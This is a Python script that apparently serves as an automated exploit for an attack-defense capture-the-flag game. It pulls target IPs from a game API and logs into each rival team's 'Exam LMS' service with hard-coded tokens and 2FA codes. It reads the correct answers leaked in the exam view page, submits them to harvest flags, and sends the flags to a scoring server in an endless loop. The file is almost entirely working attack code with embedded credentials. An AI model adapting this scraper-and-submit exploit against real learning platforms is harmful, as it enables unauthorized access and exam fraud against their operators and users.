import requests
import json
from bs4 import BeautifulSoup
import time
from datetime import datetime


class ExamLMSAutomation:
    def __init__(self, base_ip, port=16000):
        self.base_url = f"http://{base_ip}:{port}"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0'
        })

    def login(self, token, tfa_code):
        """
        Login to the ExamLMS system using token and 2FA
        """
        try:
            login_data = {
                'token': token,
                '2fa': tfa_code
            }

            login_response = self.session.post(
                f"{self.base_url}/login.php",
                data=login_data,
                allow_redirects=True
            )

            if "logout.php" in login_response.text or "Logout" in login_response.text:
                print(f"✅ Login successful for {self.base_url}")
                return True
            else:
                print(f"❌ Login failed for {self.base_url}")
                return False

        except Exception as e:
            print(f"❌ Login error for {self.base_url}: {e}")
            return False

    def parse_exam_questions(self, html_content):
        """
        Parse exam questions and answers from HTML content
        """
        soup = BeautifulSoup(html_content, 'html.parser')

        # Find the questions container
        questions_container = soup.find('div', class_='bg-light rounded border p-3 mt-3 text-dark')
        if not questions_container:
            return []

        # Find all question text divs
        question_divs = questions_container.find_all('div', class_='alert alert-secondary mt-3')

        answers = []
        for q_div in question_divs:
            # Find the next ul after the question div
            ul = q_div.find_next_sibling('ul', class_='list-group mt-3')
            if not ul:
                continue

            # Find all li in the ul
            lis = ul.find_all('li', class_='list-group-item')
            for idx, li in enumerate(lis):
                if 'bg-success' in li.get('class', []):
                    choice = chr(65 + idx)  # A for 0, B for 1, etc.
                    answers.append(choice)
                    break

        return answers

    def view_and_submit_exam(self, exam_id):
        """
        View exam and submit answers
        """
        try:
            # View the exam using exam_view.php
            view_url = f"{self.base_url}/exam_view.php?id={exam_id}"
            view_response = self.session.get(view_url)

            if view_response.status_code != 200:
                print(f"❌ Could not view exam {exam_id} on {self.base_url}")
                return None

            # Parse answers
            answers = self.parse_exam_questions(view_response.text)

            if not answers:
                print(f"❌ No answers found for exam {exam_id} on {self.base_url}")
                return None

            print(f"📝 Found {len(answers)} answers for exam {exam_id}: {answers}")

            # Submit the answers
            submit_url = f"{self.base_url}/exam_submit.php"
            submit_data = {
                "id": exam_id,
                "answers": answers
            }

            submit_response = self.session.post(
                submit_url,
                json=submit_data,
                headers={'Content-Type': 'application/json'}
            )

            if submit_response.status_code == 200:
                try:
                    response_data = submit_response.json()
                    print(f"✅ Exam {exam_id} submitted successfully on {self.base_url}")
                    print(f"📋 Response: {response_data}")
                    return response_data
                except json.JSONDecodeError:
                    print(f"✅ Exam {exam_id} submitted on {self.base_url}, response: {submit_response.text}")
                    return {"response": submit_response.text}
            else:
                print(f"❌ Failed to submit exam {exam_id} on {self.base_url}")
                return None

        except Exception as e:
            print(f"❌ Error processing exam {exam_id} on {self.base_url}: {e}")
            return None


def get_current_time():
    """Get current UTC time in the specified format"""
    return datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')


def fetch_attack_data():
    """
    Fetch attack data from the API
    """
    try:
        print("🌐 Fetching attack data from API...")
        api_url = "http://10.10.0.1/api/client/attack_data/"

        response = requests.get(api_url, timeout=30)

        if response.status_code == 200:
            attack_data = response.json()
            print("✅ Successfully fetched attack data from API")

            # Debug: Show what services are available
            print(f"📊 Available services: {list(attack_data.keys())}")

            return attack_data
        else:
            print(f"❌ Failed to fetch attack data. Status code: {response.status_code}")
            print(f"Response: {response.text}")
            return None

    except requests.exceptions.RequestException as e:
        print(f"❌ Network error while fetching attack data: {e}")
        return None
    except json.JSONDecodeError as e:
        print(f"❌ Failed to parse JSON response: {e}")
        return None
    except Exception as e:
        print(f"❌ Unexpected error while fetching attack data: {e}")
        return None


def submit_flag(flag, team_token="8207d776d0f8596a"):
    """
    Submit flag to the scoring system
    """
    try:
        print(f"🚩 Submitting flag: {flag}")

        url = "http://10.10.0.1/flags"
        headers = {
            'X-Team-Token': team_token,
            'Content-Type': 'application/json'
        }

        # Submit as JSON array
        data = json.dumps([flag])

        response = requests.put(url, data=data, headers=headers, timeout=30)

        if response.status_code == 200:
            try:
                result = response.json()
                print(f"✅ Flag submitted successfully: {result}")
                return result
            except json.JSONDecodeError:
                print(f"✅ Flag submitted, response: {response.text}")
                return {"response": response.text}
        else:
            print(f"❌ Flag submission failed. Status: {response.status_code}")
            print(f"Response: {response.text}")
            return None

    except Exception as e:
        print(f"❌ Error submitting flag: {e}")
        return None


def extract_flags_from_results(results):
    """
    Extract flags from exam submission results
    """
    flags = []

    for ip, ip_data in results.items():
        if ip_data['status'] == 'completed':
            for exam in ip_data['exams']:
                if exam['status'] == 'success' and exam['result']:
                    result = exam['result']

                    # Try to extract flag from 'msg' field
                    if isinstance(result, dict) and 'msg' in result:
                        flag = result['msg']
                        if flag and isinstance(flag, str):
                            flags.append(flag)
                            print(f"🚩 Found flag from {ip} exam {exam['exam_id']}: {flag}")

                    # Try to extract flag from 'response' field
                    elif isinstance(result, dict) and 'response' in result:
                        flag = result['response']
                        if flag and isinstance(flag, str):
                            flags.append(flag)
                            print(f"🚩 Found flag from {ip} exam {exam['exam_id']}: {flag}")

    return flags


def run_automation_cycle():
    """
    Run one complete automation cycle
    """
    # Credentials
    #TOKEN = "85e186e07c8796b1801ba0ebe816738cdc221aa500bb24c94354231dbff5736640d7d6a2468d8db7ee05b84ece40224d614a80d6f75ea74fd7fd093dc88010983ab6336a.1cc76b67605f8809ae4b0db21a527223bdec7574a229d2430583636d8eee0b4a638f203c20ed360de3d4443ad43d81ad0a254de63f8f84f9f3b811fe6e3055835956f9badcc191ac5a39c605346ddc02954fbcd8ea302e273891ea45297550ccaf4ff133801c59871c1bafad8ff07759c1178c6cfed9c1a71584fcf63d17d8c0f356dff2310c851a368c38a0896b7330e0"
    #TFA_CODE = "EGPAmOtqq0"
    TOKEN = "a957eafce89d56068d4c7cd8326b7f1031e8372efbd8b382cf1b37dfd77b78b2d069c71921f47ef719b8820a261982e42722198b55bbe211b1e2148df7dcd1101ff5afc245ba7aa2e2fb.5f4460e8cfb593818fdd4ef5e109e1493c932518012c890f469fb02823c9898c1e932a47db5ba394b0818169c3d624f4336a8880973b65930d04f454f82db2fa519a0b62872f490a7490a28d0e1dae9abc1fedc869cf47882f4439a089e5d6f67067cbad5f4e7878ebab82fa24b0b6e205c96f5a837a75a87ccf5375335fac8fcc2d626f92a11a6241a429f725b667e073d840e90d0866"
    TFA_CODE = "ACcfc3vjqE"

    print(f"🚀 ExamLMS Automation Cycle - {get_current_time()}")
    print("=" * 60)

    # Fetch attack data from API
    attack_data = fetch_attack_data()

    if not attack_data:
        print("❌ Could not fetch attack data. Skipping this cycle.")
        return False

    # Get Exam LMS data
    exam_lms_data = attack_data.get("Exam LMS (16000)", {})

    if not exam_lms_data:
        print("❌ No Exam LMS (16000) data found in API response!")
        print(f"Available services: {list(attack_data.keys())}")
        return False

    print(f"🎯 Found Exam LMS data for {len(exam_lms_data)} IPs:")
    for ip, exam_ids in exam_lms_data.items():
        print(f"  • {ip}: {exam_ids}")

    results = {}

    # Process each IP
    for ip, exam_ids in exam_lms_data.items():
        print(f"\n{'=' * 60}")
        print(f"🎯 Processing IP: {ip}")
        print(f"📚 Exam IDs: {exam_ids}")

        # Create automation instance for this IP
        automation = ExamLMSAutomation(ip, port=16000)

        # Login
        if not automation.login(TOKEN, TFA_CODE):
            print(f"❌ Skipping {ip} due to login failure")
            results[ip] = {"status": "login_failed", "exams": []}
            continue

        # Process each exam ID
        ip_results = []
        for exam_id in exam_ids:
            print(f"\n--- Processing Exam {exam_id} on {ip} ---")

            # Convert exam_id to int if it's a string
            exam_id_int = int(exam_id) if isinstance(exam_id, str) else exam_id

            result = automation.view_and_submit_exam(exam_id_int)

            ip_results.append({
                "exam_id": exam_id_int,
                "result": result,
                "status": "success" if result else "failed"
            })

            # Small delay between exams
            time.sleep(1)

        results[ip] = {
            "status": "completed",
            "exams": ip_results
        }

        print(f"✅ Completed processing for {ip}")

        # Delay between IPs
        time.sleep(2)

    # Extract and submit flags
    flags = extract_flags_from_results(results)

    if flags:
        print(f"\n🚩 Found {len(flags)} flags to submit:")
        for i, flag in enumerate(flags, 1):
            print(f"  {i}. {flag}")
            submit_result = submit_flag(flag)
            time.sleep(1)  # Small delay between flag submissions
    else:
        print("❌ No flags found to submit")

    # Print cycle summary
    print(f"\n{'=' * 60}")
    print("📊 CYCLE SUMMARY")
    print(f"{'=' * 60}")

    total_exams = 0
    successful_exams = 0

    for ip, ip_data in results.items():
        print(f"\n🌐 IP: {ip}")
        print(f"   Status: {ip_data['status']}")

        if ip_data['status'] == 'completed':
            for exam in ip_data['exams']:
                total_exams += 1
                status_emoji = "✅" if exam['status'] == 'success' else "❌"
                print(f"   {status_emoji} Exam {exam['exam_id']}: {exam['status']}")

                if exam['status'] == 'success':
                    successful_exams += 1

    print(f"\n📈 Cycle Results:")
    print(f"   Exams: {successful_exams}/{total_exams} successful")
    print(f"   Flags: {len(flags)} submitted")
    print(f"   Completed: {get_current_time()}")

    return True


def main():
    """
    Main function that runs the automation infinitely
    """
    print("🔄 Starting Infinite ExamLMS Automation")
    print(f"📅 Started at: {get_current_time()}")
    print("=" * 60)

    cycle_count = 0

    try:
        while True:
            cycle_count += 1
            print(f"\n🔄 CYCLE {cycle_count} - {get_current_time()}")
            print("=" * 60)

            try:
                success = run_automation_cycle()

                if success:
                    print(f"✅ Cycle {cycle_count} completed successfully")
                else:
                    print(f"⚠️  Cycle {cycle_count} completed with issues")

            except Exception as e:
                print(f"❌ Error in cycle {cycle_count}: {e}")

            # Wait before next cycle (5 minutes)
            wait_time = 30  # 5 minutes in seconds
            print(f"\n⏳ Waiting {wait_time} seconds before next cycle...")
            time.sleep(wait_time)

    except KeyboardInterrupt:
        print(f"\n\n🛑 Automation stopped by user")
        print(f"📊 Total cycles completed: {cycle_count}")
        print(f"📅 Stopped at: {get_current_time()}")


if __name__ == "__main__":
    main()